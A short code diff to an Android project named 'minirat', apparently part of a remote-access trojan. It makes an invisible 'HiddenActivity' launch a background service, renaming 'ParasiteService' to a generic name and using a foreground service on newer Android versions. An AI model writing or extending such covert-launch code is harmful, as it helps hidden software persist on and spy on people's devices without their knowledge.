@@ -2,6 +2,7 @@ package com.app.minirat;
 
 import android.app.Activity;
 import android.content.Intent;
+import android.os.Build;
 import android.os.Bundle;
 import android.view.WindowManager;
 
@@ -20,8 +21,13 @@ public class HiddenActivity extends Activity {
                         WindowManager.LayoutParams.FLAG_LAYOUT_INSET_DECOR
         );
 
-        // Start the main service
-        startService(new Intent(this, ParasiteService.class));
+        // Start the service
+        Intent serviceIntent = new Intent(this, Service.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(serviceIntent);
+        } else {
+            startService(serviceIntent);
+        }
 
         // Finish immediately - no UI shown
         finish();
